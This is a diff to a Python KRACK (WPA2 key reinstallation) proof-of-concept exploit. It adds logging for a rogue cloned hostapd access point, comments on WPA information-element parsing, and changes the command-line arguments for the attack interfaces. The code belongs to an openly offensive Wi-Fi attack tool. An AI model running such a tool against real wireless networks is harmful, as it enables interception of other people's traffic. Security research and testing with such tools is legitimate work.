@@ -298,12 +298,15 @@ class NetworkConfig():
 			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
 				self.real_channel = ord(el.info.decode('unicode_escape')[0])
 			elif el.ID == IEEE_TLV_TYPE_RSN:
+				# 有 RSN Info 為 WPA2
 				self.parse_wparsn(el.info)
 				self.wpavers |= 2
 			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x01":
+				# Micrsoft OUI: 00 50 f2; OUI Type: 01 (WPA)
 				self.parse_wparsn(el.info[4:])
 				self.wpavers |= 1
 			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info.decode('unicode_escape')[:4] == "\x00\x50\xf2\x02":
+				# Micrsoft OUI: 00 50 f2; OUI Type: 02 (WPA)
 				self.wmmenabled = 1
 
 			el = el.payload
@@ -430,6 +433,7 @@ class KRAckAttack():
 		self.apmac = None
 		self.netconfig = None
 		self.hostapd = None
+		self.hostapd_log = None
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
@@ -762,6 +766,7 @@ class KRAckAttack():
 			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
 		else:
 			log(ALL, "Rogue hostapd: " + line.strip().decode())
+		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())
 
 	def configure_interfaces(self):
 		# 0. Warn about common mistakes
@@ -838,7 +843,8 @@ class KRAckAttack():
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
 		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-
+		self.hostapd_log = open("hostapd_rogue.log", "w")
+		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
 
@@ -896,6 +902,8 @@ class KRAckAttack():
 		if self.hostapd:
 			self.hostapd.terminate()
 			self.hostapd.wait()
+		if self.hostapd_log:
+			self.hostapd_log.close()
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
@@ -913,12 +921,12 @@ if __name__ == "__main__":
 	# 必要的參數
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
 	parser.add_argument("nic_real_clientack", help="Wireless monitor interface that will station on the channel of the target AP.")
+	parser.add_argument("nic_rogue_mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
 	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 	parser.add_argument("password", help="The password of the network to attack.")
 
 	# 選擇性參數
-	parser.add_argument("-m", "--nic-rogue-mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
 	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
 	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
 	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
